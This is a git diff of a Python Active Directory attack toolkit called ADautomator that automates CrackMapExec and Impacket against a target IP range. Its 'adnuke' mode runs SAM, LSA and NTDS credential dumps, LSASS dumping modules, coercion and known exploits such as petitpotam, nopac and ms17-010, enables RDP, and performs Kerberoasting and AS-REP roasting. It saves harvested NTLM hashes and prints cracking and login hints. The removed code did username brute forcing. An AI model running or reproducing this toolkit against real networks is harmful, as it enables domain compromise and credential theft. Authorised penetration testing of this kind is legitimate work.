@@ -4,8 +4,13 @@ import sys
 import re
 import time
 from datetime import datetime
+import argparse
+import contextlib
 
-print(r"""  
+
+
+def print_banner():
+    print(r"""  
             d8888 8888888b.                    888                                   888                    
            d88888 888  "Y88b                   888                                   888                    
           d88P888 888    888                   888                                   888                    
@@ -14,202 +19,367 @@ print(r"""
        d88P   888 888    888 .d888888 888  888 888   888  888 888  888  888 .d888888 888   888  888 888     
       d8888888888 888  .d88P 888  888 Y88b 888 Y88b. Y88..88P 888  888  888 888  888 Y88b. Y88..88P 888     
      d88P     888 8888888P"  "Y888888  "Y88888  "Y888 "Y88P"  888  888  888 "Y888888  "Y888 "Y88P"  888
-""")
+    """)
+    print("\nWritten by CB\n")
+    print("\nAn Active Directory Cybersecurity Toolkit\n")
+    print("\nVersion 1.0\n")
 
-# This checks to see if the files below exists and deletes them as they will be part of the output file with a IP and DTG
-def delete_file(filename):
-    """kerberoast_hash.txt"""
-    """asreproast_hash.txt"""
-    try:
-        os.remove(filename)
-    except OSError:
-        pass
-
-# Installs Seclists, crackmapexec, impacket, and downloads kerbrute to the local folder
-def install_packages():
-    # seclists
+# Code to install packages
+def install_packages(args):
     subprocess.run(['sudo', 'apt', 'install', 'seclists', '-y'])
-    # crackmapexec
     subprocess.run(['sudo', 'apt', 'install', 'crackmapexec', '-y'])
-    # ntpdate
     subprocess.run(['sudo', 'apt', 'install', 'ntpdate', '-y'])
-    # impacket
     subprocess.run(['sudo', 'apt', 'install', 'python3-impacket', '-y'])
-    # tqdm for the progress bar
-    subprocess.run(['pip', 'install', 'tqdm'])
-    # Check for kerbrute
+    subprocess.run(['wget', 'https://raw.githubusercontent.com/urbanadventurer/username-anarchy/master/format-plugins.rb'])
+    subprocess.run(['wget', 'https://raw.githubusercontent.com/urbanadventurer/username-anarchy/master/username-anarchy'])
+    print(f"Running Installation: {args.install}")
+    print("Installing necessary packages...")
 
-# Creates a standard filename for the functions
-def generate_single_filename(ip):
-    # Replace slashes with underscores
-    ip = ip.replace("/", "_")
-    return f"{ip}_{datetime.now().strftime('%d_%b_%Y_%H%M')}.txt"
+# Code to install packages
+def generate_filename(ip):
+    current_time = datetime.now().strftime('%d%b%y%H%M')
+    filename = f"{ip}_{current_time}.txt"
+    return filename
 
-# Function to append an entry to /etc/hosts
-def append_to_hosts(dc_ip, domain_name):
-    try:
-        with open("/etc/hosts", "a") as hosts_file:
-            hosts_file.write(f"{dc_ip}{' '*7}{domain_name}\n")
-        print(f"Added {domain_name} with IP {dc_ip} to /etc/hosts.")
-    except Exception as e:
-        print(f"Failed to append to /etc/hosts: {e}")
-        sys.exit(1)
+# Code to check lockout policy
+def check_lockout_policy(output, ip_address):
+    # Split the output into lines
+    lines = output.split('\n')
+    lockout_policy_detected = False
 
+    for line in lines:
+        # Check if the line contains lockout policy information
+        if "Account Lockout Threshold:" in line and "None" not in line:
+            lockout_policy_detected = True
+            # Splitting the line by spaces and extracting the IP address
+            parts = line.split()
+            # Extract the IP address from the line
+            extracted_ip = parts[1]  # Assuming the IP address is in the second position
 
-def perform_kerberos(domain_name, username, password, dc_ip, user_list_path=None):
-    with open("/etc/hosts", "a") as hosts_file:
-        hosts_file.write(f"{dc_ip}{' '*7}{domain_name}\n")
-
-    # Construct the command
-    command = f"impacket-GetNPUsers -usersfile {user_list_path} -dc-ip {dc_ip} -request {domain_name}/ -format hashcat"
-
-    # Run the command
-    process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-    # Get the standard output
-    output = process.stdout
-
-    # Filter the output, removing lines containing 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
-    filtered_output = "\n".join(filter(lambda line: 'KDC_ERR_C_PRINCIPAL_UNKNOWN' not in line, output.splitlines()))
-
-    print(filtered_output)
- 
-def execute_kerbrute(dc_ip, domain_name):
-    print("1. Use built-in user list")
-    print("2. Use custom user list")
-    choice = input("Choose an option (1 or 2): ")
-
-    if choice == '1':
-        user_list_path = '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
+            # Print the alert with the extracted IP address in red
+            print(f"\033[91m\033[1mAlert: There is a lockout policy enabled on {extracted_ip}. Brute forcing usernames and passwords may cause a denial of service.\033[0m\033[0m")
+    
+    # If a lockout policy was detected, ask the user if they want to continue
+    if lockout_policy_detected:
+        try:
+            print("Do you want to continue? (y/n): ", end='', flush=True)
+            time.sleep(10)
+            user_decision = input().strip().lower()
+            return user_decision == 'y'
+        except EOFError:
+            print("\nNo input received. Exiting...")
+            return False
     else:
-        user_list_path = input("Enter the path to your user list: ")
-    
-    print("\n*****Kerbrute attack in progress, please wait*****")
-    subprocess.run(['chmod', '+x', 'kerbrute_linux_amd64'])
-    subprocess.run(['./kerbrute_linux_amd64', 'userenum', '--dc', dc_ip, '-d', domain_name, user_list_path, '--downgrade'])
-    print("\n*****Kerbrute attack complete*****")
-    
-def execute_crackmapexec(cidr_range, domain_name, output_filename):
-    # Creates an empty file
-    if not os.path.exists(output_filename):
-        with open(output_filename, 'w') as f:
-            pass
+        # If no lockout policy was detected, return True to continue
+        return True
 
-    with open(output_filename, 'a') as f:	
-        known_username = input("Do you know the username? Select n to enter username list. (y/n): ").strip().lower()
-        if known_username == 'y':
-            username = input("Please enter the username for CrackMapExec: ").strip()
+# Code to find NTLM hashes
+def find_ntlm_hashes(output):
+    # Regex pattern to capture the entire line from "SMB" to ":::"
+    ntlm_hash_pattern = r'[^ ]+:\d+:aad3b435b51404eeaad3b435b51404ee:[a-f0-9]{32}:::'
+    # Compile the pattern into a regular expression object
+    compiled_ntlm_hash_pattern = re.compile(ntlm_hash_pattern)
+    ntlm_hash_segments = compiled_ntlm_hash_pattern.findall(output)
+
+    # Check if any NTLM hash segments were found
+    if ntlm_hash_segments:
+        print("\033[93m\033[1mAlert: Found NTLM hash segments! They will be saved.\033[0m\033[0m")
+        print("\033[93m\033[1mAlert: To crack: hashcat.exe -m 1000 -a 3 hashes.txt rockyou.txt -o cracked.txt.\033[0m\033[0m")
+    
+        if ntlm_hash_segments:
+            print("\033[93m\033[1mAlert: Found NTLM hash segments! They will be saved.\033[0m\033[0m")
+            for segment in ntlm_hash_segments:
+                print(f"\033[93m{segment}\033[0m")  # Print each segment in yellow
         else:
-            username_list_path = input("Enter the path to your username list: ").strip()
-            username = f" {username_list_path}"
+            print("No NTLM hash segments found.")
 
-    known_password = input("Do you know the password? Select n to enter password list. (y/n): ").strip().lower()
-    if known_password == 'y':
-        password = input("Please enter the password for CrackMapExec: ").strip()
-    else:
-        password_list_path = input("Enter the path to your password list: ").strip()
-        password = f" {password_list_path}"
+        return ntlm_hash_segments
+
+# Code to check if there are users detected when the --users flag is used
+def check_users(output, ip_address):
+    # Regex pattern to capture the username after the backslash and before the space
+    username_pattern = r'\\([^:\\\s]+)\s'
+
+    # Use the pattern to find usernames in the output
+    usernames = re.findall(username_pattern, output)
+
+    # Write the usernames to a file
+    with open('users.txt', 'w') as file:
+        for username in usernames:
+            file.write(username + '\n')
+
+    # Print the alert if any usernames were found
+    if usernames:
+        print("\033[93m\033[1mAlert: Found usernames! They will be saved as users.txt.\033[0m\033[0m")
+        print("\033[93m\033[1mAlert: crackmapexec smb IP -u users.txt -p password.txt\033[0m\033[0m")
+        print("\033[93m\033[1mAlert: sudo python3 ADautomator.py --adnuke -u users.txt -p PASSWORD\033[0m\033[0m")
+        
+
+# Code to check if the IP address is pwned
+def check_pwned(output, ip_address):
+    pwned_lines = [line for line in output.split('\n') if "(Pwn3d!)" in line]
+
+    for line in pwned_lines:
+        # Splitting the line by spaces and extracting the IP address
+        parts = line.split()
+        # Assuming the IP address is in a specific position, adjust as needed
+        ip_address = parts[1]  # Adjust the index based on your output format
+        #Print the alert with the IP address in red
+        print(f"\033[93m\033[1mAlert: YOU CAN LOG ONTO {ip_address}. USE PSEXEC, SMBEXEC, OR WMIEXEC TO LOG IN!!\033[0m\033[0m")
+
+def check_rdp_status(output, ip_address):
+    rdp_lines = [line for line in output.split('\n') if "RDP" in line]
+
+    for line in rdp_lines:
+        # Splitting the line by spaces and extracting the IP address
+        parts = line.split()
+        # Assuming the IP address is in a specific position, adjust as needed
+        ip_address = parts[1]  # Adjust the index based on your output format
+        #Print the alert with the IP address in red
+        print(f"\033[93m\033[1mAlert: RDP IS NOW ENABLED {ip_address}.\033[0m\033[0m")
+
+
+# Code to run domainenum which is CrackMapExec with just non invasive flags set
+def run_domainenum(ip_address, username, password, args):
+    flag_checks = {
+    '': check_pwned,
+    '': check_lockout_policy,
+    '--pass-pol': check_lockout_policy,
+    '--users': check_pwned,
+    '--users': check_users,
+    '--shares': check_pwned,
+    '--sam': check_pwned,
+    '--lsa': check_pwned,
+    '--ntds': check_pwned,
+    '--ntds vss': check_pwned,
+    '--ntds-history': check_pwned,
+    '-M' 'rdp' '-o' 'ACTION=enable': check_rdp_status,
+    }
+
+    # List of smb flags and modules to loop through
+    smbflags = ['', '--pass-pol', '--users', '--shares', '--sessions', '--sam', '--lsa', 
+                '--ntds',]
+
+    # List to store all found hash segments
+    all_ntlm_hash_segments = []
     
+    # Loop through all smb flags and modules
+    for smbflag in smbflags:
+        print(f"Processing flag: {smbflag}")
+        command = ['crackmapexec', 'smb', ip_address]
+        if username:
+            command.extend(['-u', username])
+        if password:
+            command.extend(['-p', password])
+        if smbflag:
+            command.append(smbflag)
+        
+        print(f"Running CrackMapExec on IP: {ip_address} with flag: {smbflag}")
+        result = subprocess.run(command, capture_output=True, text=True)
+        print(result.stdout)
+
+# Code to run ADNuke which is CrackMapExec with all smb and ldap flags set
+def run_adnuke(ip_address, username, password, args):
+    flag_checks = {
+    '': check_pwned,
+    '--pass-pol': check_lockout_policy,
+    '--users': check_pwned,
+    '--users': check_users,
+    '--shares': check_pwned,
+    '--sam': check_pwned,
+    '--lsa': check_pwned,
+    '--ntds': check_pwned,
+    '--ntds vss': check_pwned,
+    '--ntds-history': check_pwned,
+    '-M rdp -o ACTION=enable': check_rdp_status,
+    }
+
+    # List of smb flags and modules to loop through
+    smbflags = ['', '--pass-pol', '--users', '--shares', '--sessions', '--sam', '--lsa', 
+                '--ntds', '--ntds vss', '-M rdp -o ACTION=enable', '-M dfscoerce', '-M enum_dns', 
+                '-M get_netconnections', '-M gpp_autologin', '-M gpp_password',
+                '-M handlekatz', '-M install_elevated', '-M ioxidresolver', 
+                '-M keepass_discover', '-M masky', '-M ms17-010', '-M nopac',
+                '-M nanodump', '-M petitpotam', '-M uac', '-M webdav', '-M wireless']
+
+    ldapflags = ['', '--asreproast' 'asrep_hash.txt', '--kerberoasting' 'kerberos_hash.txt',
+                '--trusted-for-delegation', '--password-not-required', '--admin-count', '--users',
+                '--gmsa', '--get-sid', '-M MAQ', '-M adcs', '-M daclread', '-M get-desc-users',
+                '-M get-network', '-M laps', '-M ldap-checker', '-M ldap-signing', '-M subnets',
+                '-M user-desc', '-M whoami'] 
     
-     # SMB command and flags
-    smb_base_command = ['crackmapexec', 'smb', cidr_range, '-u', username, '-p', password]
-    smb_cme_flags = [
-        '--shares', '--pass-pol', '--users', '--sam --continue-on-success', '--sam',
-        '--lsa --continue-on-success', ' --lsa', '--ntds --continue-on-success',
-        '--ntds vss --continue-on-success' , '--ntds'
-    ]
+    # List to store all found hash segments
+    all_ntlm_hash_segments = []
 
-    # LDAP command and flags
-    ldap_base_command = ['crackmapexec', 'ldap', cidr_range, '-u', username, '-p', password]
-    ldap_cme_flags = [
-        '--asreproast asreproast_hash.txt', '--kerberoasting kerberoast_hash.txt'
-    ]
+    # List of flags that require user input
+    smbflags_requiring_input = ['-M ioxidresolver', '-M petitpotam']
 
-  
-
-    with open(output_filename, 'a') as f:
-    	# Run SMB commands
-    	for flags in smb_cme_flags:
-            command = smb_base_command + flags.split()
-            print("Executing SMB command:", ' '.join(command))
-            result = subprocess.run(command, stdout=subprocess.PIPE, input="\n", text=True)
+    # Loop through all smb flags and modules
+    for smbflag in smbflags:
+        command = ['crackmapexec', 'smb', args.ipaddress]
+        if args.username:
+            command.extend(['-u', args.username])
+        if args.password:
+            command.extend(['-p', args.password])
+        if args.hash:
+            command.extend(['-H', args.hash])
+        command.extend(smbflag.split())  # Split smbflag into a list of its components
+        
+        print("Executing command:", " ".join(command))
+        if smbflag in smbflags_requiring_input:
+            # Send 'y' as input to the command
+            result = subprocess.run(command, input='y\n', capture_output=True, text=True, encoding='utf-8')
+        else:
+            result = subprocess.run(command, capture_output=True, text=True)
+        print(result.stdout)
+           
+        # Check if the output contains NTLM hash segments
+        ntlm_hash_segments = find_ntlm_hashes(result.stdout)
+        if ntlm_hash_segments:
+            # Add the found hash segments to the list
+            all_ntlm_hash_segments.extend(ntlm_hash_segments)
             
-            # Write the output to file and check for patterns
-            f.write(result.stdout)
-            if "Pwn3d!" in result.stdout:
-                print(result.stdout)  # This will print the matching lines to the console
+        # Check if the output contains any flags that require user input
+        if smbflag in flag_checks:
+            print(f"Checking flag: {smbflag}")
+            should_continue = flag_checks[smbflag](result.stdout, args.ipaddress)
+            print(f"Decision to continue: {should_continue}")
+            if should_continue is not None and not should_continue:
+                print("User chose not to continue. Exiting...")
+                sys.exit(0) 
 
-    with open(output_filename, 'a') as f:
-        # Run LDAP commands
-        for flags in ldap_cme_flags:
-            command = ldap_base_command + flags.split()
-            print("Executing LDAP command:", ' '.join(command))
-            subprocess.run(command, stdout=f, input="\n", text=True)  # This presses enter after every command
-            # Deletes the file as the output is included in the final script
-            if "asreproast asreproast_hash.txt" in flags:
-                delete_file("asreproast_hash.txt")
-            if "kerberoasting kerberoast_hash.txt" in flags:
-                delete_file("kerberoast_hash.txt")
+    # List of flags that require user input
+    ldapflags_requiring_input = ['-M MAQ', '-M daclread', '-M laps', '-M subnets']
     
-    return cidr_range
-
-def main_menu():
-    print("\n--------- Active Directory Penetration Testing Tools ---------")
-    print("0. Install packages - Seclists, Crackmapexec, Impacket, Ntpdate")
-    print("1. Crackmapexec - Enumeration of Domain Controller")
-    print("2. Kerbrute - Enumerate valid AD accounts via Kerberos Pre-Authentication")
-    print("3. Kerberoast")
-    print("4. Exit")
-    try:
-        choice = input("Select an option (0-4): ")
-    except EOFError:
-        print("Unexpected end of input detected. Exiting program.")
-        sys.exit(1)
-
-    if choice == "0":
-        install_packages()
+    # Loop through all ldap flags and modules
+    for ldapflag in ldapflags:
+        print(f"Processing flag: {ldapflag}")
+        command = ['crackmapexec', 'ldap', args.ipaddress]
+        if args.username:
+            command.extend(['-u', args.username])
+        if args.password:
+            command.extend(['-p', args.password])
+        if args.hash:
+            command.extend(['-H', args.hash])
+        command.extend(ldapflag.split())  # Split ldapflag into a list of its components
         
-    elif choice == "1":
-        domain_name = input("Enter the domain name: ")
-        cidr_range = input("Provide a CIDR range to scan ad AD connected computers - This will be noisy! ")
-        print("This command will output the results in this directory ""IP_DTG""")
-        output_filename = generate_single_filename(cidr_range)  # use cidr_range instead of entered_ip
-        dc_ip = input("Enter the Domain Controller IP to add to /etc/hosts, leave blank if its already there: ")
-        add_to_hosts = input("Do you want to enter the DC IP to the /etc/hosts? (y/n): ").strip().lower()
-        if add_to_hosts == 'y':
-            append_to_hosts(dc_ip, domain_name)  # Only call if user confirms with a y
-        entered_ip = execute_crackmapexec(cidr_range, domain_name, output_filename)
+        print("Executing command:", " ".join(command))
+        if ldapflag in ldapflags_requiring_input:
+            # Send 'y' as input to the command
+            result = subprocess.run(command, input='y\n', capture_output=True, text=True, encoding='utf-8')
+        else:
+            result = subprocess.run(command, capture_output=True, text=True)
+        print(result.stdout)
+           
+        # Check if the output contains NTLM hash segments
+        ntlm_hash_segments = find_ntlm_hashes(result.stdout)
+        if ntlm_hash_segments:
+            # Add the found hash segments to the list
+            all_ntlm_hash_segments.extend(ntlm_hash_segments)
+            
+        # Check if the output contains any flags that require user input
+        if ldapflag in flag_checks:
+            print(f"Checking flag: {ldapflag}")
+            should_continue = flag_checks[ldapflag](result.stdout, args.ipaddress)
+            print(f"Decision to continue: {should_continue}")
+            if should_continue is not None and not should_continue:
+                print("User chose not to continue. Exiting...")
+                sys.exit(0)
+    #Creates a file for the hashes
+    timestamped_filename = f"ntlm_hash_{datetime.now().strftime('%d%b%y_%H%M')}.txt"
 
-    elif choice == "2":
-        dc_ip = input("Please enter the DC IP: ")
-        domain_name = input("Please enter the domain name: ")
-        add_to_hosts = input("Do you want to enter the DC IP to the /etc/hosts? (y/n): ").strip().lower()  
-        if add_to_hosts == 'y':
-            append_to_hosts(dc_ip, domain_name)  # Only call if user confirms with a y
-        subprocess.run(['chmod', '+x', 'kerbrute_linux_amd64'])
-        execute_kerbrute(dc_ip, domain_name)
-        
-    elif choice == "3":
-        dc_ip = input("Please enter the DC IP: ")
-        domain_name = input("Please enter the domain name: ")
-        add_to_hosts = input("Do you want to enter the DC IP in the /etc/hosts? (y/n): ").strip().lower()  # Ask user
-        if add_to_hosts == 'y':
-            append_to_hosts(dc_ip, domain_name)  # Only call if user confirms with a y
-        kerberos_username = input("Please enter the username: ")
-        kerberos_password = input("Enter the password: ")
-        user_list_path = input("Enter the path to user list: ")
-        perform_kerberos(domain_name, kerberos_username, kerberos_password, dc_ip, user_list_path)
-        
-    elif choice == "4":
-        sys.exit(0)
-    else:
-        print("Invalid choice! Please select a valid option.")
+    with open(timestamped_filename, 'w') as file: # Open the file to write
+        for segment in all_ntlm_hash_segments:
+            file.write(segment + '\n') 
+
+    with open(timestamped_filename, 'r') as file: # Open the file to read
+        unique_hashes = set(file.readlines())
+    with open(timestamped_filename, 'w') as file: # Open the file to write
+        for hash_segment in unique_hashes:
+            file.write(hash_segment)
+
+# to save the output to a file
+class DualOutput:
+    def __init__(self, filename=None):
+        self.terminal = sys.stdout
+        self.log = open(filename, "w") if filename else None
+    
+    def write(self, message):
+        self.terminal.write(message)
+        if self.log:
+            self.log.write(message)
+    
+    def flush(self):
+        self.terminal.flush()
+        if self.log:
+            self.log.flush()
+
+def main(args):
+    original_stdout = sys.stdout  # Save the original stdout
+    if args.output:
+        sys.stdout = DualOutput(args.output)  # Redirect stdout to DualOutput
+
+    print_banner()
+    
+    # Your existing code for handling different flags
+    if args.install:
+        # Code to handle installation
+        print(f"Running Installation: {args.install}")
+        install_packages(args) # Call the function to install packages
+    
+    # Code to handle domain enumeration
+    if args.domainenum:
+        # Code to handle domain enumeration
+        print(f"Running Domain Enumeration: {args.domainenum}")
+        #run_domainenum(args.ipaddress, args.username, args.password)
+
+    if args.output:
+        # Code to handle output
+        print(f"Running Output: {args.output}")
+        #run_output(args.ipaddress, args.username, args.password)
+        sys.stdout = DualOutput(args.output) # Redirect stdout to a file
+
+    if args.adnuke:
+        # Code to handle ADNuke        
+        print(f"Running ADNuke with options: {args.adnuke}")
+        run_adnuke(args.ipaddress, args.username, args.password, args)    
+
+    # MAKE SURE TO KEEP THIS LAST - Reset stdout to its original value
+    if args.output:
+        sys.stdout.log.close()
+        sys.stdout = sys.__stdout__
+
 
 if __name__ == "__main__":
-    if os.geteuid() != 0:
-        print("This script requires elevated permissions. Please run with sudo.")
-        sys.exit(1)
+    # Argument Parser Setup
+    parser = argparse.ArgumentParser(description="An Active Directory Cybersecurity Toolkit",
+                                     epilog="Examples:\n"
+    "  ADautomator.py --install\n"  
+    "  ADautomator.py --adnuke -ip 192.168.56.0/24\n"
+    "  ADautomator.py --adnuke -ip 192.168.56.0/24 -u username -p password -out output.txt\n"
+    "  ADautomator.py --adnuke -ip targets.txt -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4 -out testout.txt\n"
+    "  ADautomator.py --domainenum -ip targets.txt -u username -p password -out output.txt\n"
+    "  ADautomator.py --domainenum -ip targets.txt -out testout.txt\n",
+    formatter_class=argparse.RawTextHelpFormatter)
+
+    parser.add_argument('-d', '--domain', help='Domain name'), 
+    parser.add_argument('-ip', '--ipaddress', help='IP address of the targets, CIDR, or file with IPs'),
+    parser.add_argument('-out', '--output', help='Output results to a file', type=str)
+    parser.add_argument('--install', help='Install necessary packages', action='store_true')
+    parser.add_argument('-u', '--username', help='Username for any tool', default='')
+    parser.add_argument('-p', '--password', help='Password for any tool', default='')
+    parser.add_argument('-H', '--hash', help='Hash for any tool', default='')
+    parser.add_argument("--adnuke", help="Run CrackMapExec with DC IP, username, password and all smb and ldap flags set", action='store_true')
+    parser.add_argument("--domainenum", help="Run ALL CrackMapExec Modules and Flags set", action='store_true')
+    args = parser.parse_args()
     
+    if not any([args.adnuke, args.domainenum]):
+        parser.error("You must use one of the following --adnuke, --domainenum, or --install")
     
-    while True:
-        main_menu()
+    if args.adnuke and not args.ipaddress:
+        parser.error("--adnuke requires --ip to be specified")
+    
+    if args.domainenum and not args.ipaddress:
+        parser.error("--domainenum requires --ip to be specified")
+
+    main(args)
